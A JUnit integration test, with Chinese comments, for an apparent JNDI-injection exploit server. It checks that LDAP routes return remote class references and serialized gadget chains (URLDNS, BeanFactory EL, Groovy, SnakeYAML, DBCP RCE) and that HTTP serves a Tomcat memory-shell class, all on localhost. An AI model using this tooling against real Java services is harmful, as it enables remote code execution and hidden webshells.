package com.bloom.server;

import com.bloom.util.config;
import com.unboundid.ldap.sdk.LDAPConnection;
import com.unboundid.ldap.sdk.SearchResultEntry;
import com.unboundid.ldap.sdk.SearchScope;
import org.junit.Assert;
import org.junit.BeforeClass;
import org.junit.Test;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.URL;

/**
 * LDAP/HTTP 投递链路集成测试：只读 LDAP 返回属性与 HTTP 状态，不触发客户端 JNDI 解析。
 */
public class LdapServerIntegrationTest {

    private static int ldapPort;
    private static int httpPort;

    @BeforeClass
    public static void startServers() throws Exception {
        ldapPort = freePort();
        httpPort = freePort();
        config.ip = "127.0.0.1";
        config.ldapPort = ldapPort;
        config.httpPort = httpPort;
        HttpServerStart.start();
        LdapServer.lanuchLDAPServer();
        Thread.sleep(300);
    }

    @Test
    public void basicRouteReturnsRemoteReference() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/base64/aWQ=", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertEquals("foo", entry.getAttributeValue("javaClassName"));
            String factory = entry.getAttributeValue("javaFactory");
            Assert.assertNotNull("basic 路由应返回 javaFactory", factory);
            Assert.assertNotNull(entry.getAttributeValue("javaCodeBase"));
            Assert.assertNull("basic 路由不应携带序列化数据", entry.getAttributeValue("javaSerializedData"));

            URL url = new URL("http://127.0.0.1:" + httpPort + "/" + factory.replace('.', '/') + ".class");
            HttpURLConnection http = (HttpURLConnection) url.openConnection();
            Assert.assertEquals("HTTP 侧应能取到工厂类字节码", 200, http.getResponseCode());
            Assert.assertTrue(http.getContentLength() > 0);
            http.disconnect();
        }
    }

    @Test
    public void gadgetRouteReturnsSerializedData() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("URLDNS/test.example.com", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNotNull("gadget 路由应返回 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
            Assert.assertNull(entry.getAttributeValue("javaFactory"));
        }
    }

    // #9 回归：basic/memshell 已知名投递，javaFactory 与 HTTP 缓存 key 均为简单类名。
    @Test
    public void memshellRouteServesShell() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/memshell/TomcatFilterMemShellFromThread", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertEquals("TomcatFilterMemShellFromThread", entry.getAttributeValue("javaFactory"));

            URL url = new URL("http://127.0.0.1:" + httpPort + "/TomcatFilterMemShellFromThread.class");
            HttpURLConnection http = (HttpURLConnection) url.openConnection();
            Assert.assertEquals("HTTP 侧应能取到内存马字节码", 200, http.getResponseCode());
            Assert.assertTrue(http.getContentLength() > 0);
            http.disconnect();
        }
    }

    // #9：未知 memshell 名必须被服务端明确拒绝并输出报错，不得静默 200/404 假象。
    @Test
    public void unknownMemshellRejectedWithError() throws Exception {
        ByteArrayOutputStream serverLog = new ByteArrayOutputStream();
        PrintStream originalOut = System.out;
        System.setOut(new PrintStream(serverLog, true, "UTF-8"));
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("basic/memshell/NoSuchShell", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNull("非法 memshell 不得返回 javaFactory", entry.getAttributeValue("javaFactory"));
        } finally {
            System.setOut(originalOut);
        }
        Assert.assertTrue("服务端应输出明确报错: " + serverLog,
                serverLog.toString("UTF-8").contains("无该内存马类型"));
    }

    // BeanFactory 系 12 类路由默认序列化投递（序列化 ResourceRef），目标反序列化得到真 ResourceRef 才能命中工厂。
    @Test
    public void beanFactoryRoutesReturnSerializedReference() throws Exception {
        String[] routes = {
                "EL/id", "groovyBytomcat/id", "snakeyaml/http://127.0.0.1/exp.jar",
                "XStream/id", "mvel/id", "BeanShell2/id",
                "tomcat_dbcp1_RCE/http://127.0.0.1/a.xml", "tomcat_dbcp2_RCE/http://127.0.0.1/a.xml",
                "commons_dbcp1_RCE/http://127.0.0.1/a.xml", "commons_dbcp2_RCE/http://127.0.0.1/a.xml",
                "druidjdbc/http://127.0.0.1/a.xml", "tomcatjdbc/http://127.0.0.1/a.xml",
        };
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            for (String route : routes) {
                SearchResultEntry entry = conn.searchForEntry(route, SearchScope.BASE, "(objectClass=*)");
                Assert.assertNotNull(route, entry);
                byte[] ser = entry.getAttributeValueBytes("javaSerializedData");
                Assert.assertNotNull(route + " 应含 javaSerializedData", ser);
                Assert.assertTrue(route + " 应为合法 Java 序列化流",
                        ser.length > 4 && (ser[0] & 0xFF) == 0xAC && (ser[1] & 0xFF) == 0xED);
                Assert.assertTrue(route + " 反序列化应为 Reference", deserialize(ser) instanceof javax.naming.Reference);
                Assert.assertNull(route + " 默认不应属性直返", entry.getAttributeValues("javaReferenceAddress"));
            }
        }
    }

    // --ref-attrs 回退属性直返（仅限接受裸 Reference 的工厂，如 MemoryUserDatabaseFactory）。
    @Test
    public void refAttrsReturnsDirectReference() throws Exception {
        config.refAttrs = true;
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("tomcat_xxe/http://127.0.0.1/xxe.xml", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNotNull("ref-attrs 应直返 javaReferenceAddress", entry.getAttributeValues("javaReferenceAddress"));
            Assert.assertNull("ref-attrs 不应输出 javaSerializedData", entry.getAttributeValue("javaSerializedData"));
        } finally {
            config.refAttrs = false;
        }
    }

    // #5: ELjakarta 路由默认序列化投递（jakarta 命名空间类名在序列化 ResourceRef 内）。
    @Test
    public void elJakartaRouteReturnsSerializedReference() throws Exception {
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("ELjakarta/base64/aWQ=", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            byte[] ser = entry.getAttributeValueBytes("javaSerializedData");
            Assert.assertNotNull("ELjakarta 应含 javaSerializedData", ser);
            javax.naming.Reference ref = (javax.naming.Reference) deserialize(ser);
            Assert.assertEquals("jakarta.el.ELProcessor", ref.getClassName());
            Assert.assertEquals("org.apache.naming.factory.BeanFactory", ref.getFactoryClassName());
            Assert.assertNull(entry.getAttributeValues("javaReferenceAddress"));
        }
    }

    // #5: ELjakarta 内存马注入必须明确报错（仅支持反序列化链），不产出任何 payload 属性。
    @Test
    public void elJakartaMemshellRejectedWithError() throws Exception {
        ByteArrayOutputStream serverLog = new ByteArrayOutputStream();
        PrintStream originalOut = System.out;
        System.setOut(new PrintStream(serverLog, true, "UTF-8"));
        try (LDAPConnection conn = new LDAPConnection("127.0.0.1", ldapPort)) {
            SearchResultEntry entry = conn.searchForEntry("ELjakarta/memshell/TomcatFilterMemShellFromThread", SearchScope.BASE, "(objectClass=*)");
            Assert.assertNotNull(entry);
            Assert.assertNull("拒绝后不得产出 Reference 属性", entry.getAttributeValue("javaReferenceAddress"));
            Assert.assertNull("拒绝后不得产出序列化数据", entry.getAttributeValue("javaSerializedData"));
        } finally {
            System.setOut(originalOut);
        }
        Assert.assertTrue("应明确报仅支持反序列化链: " + serverLog,
                serverLog.toString("UTF-8").contains("仅支持反序列化链"));
    }

    private static int freePort() throws Exception {
        try (ServerSocket socket = new ServerSocket(0)) {
            return socket.getLocalPort();
        }
    }

    private static Object deserialize(byte[] bytes) throws Exception {
        try (java.io.ObjectInputStream ois = new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(bytes))) {
            return ois.readObject();
        }
    }
}
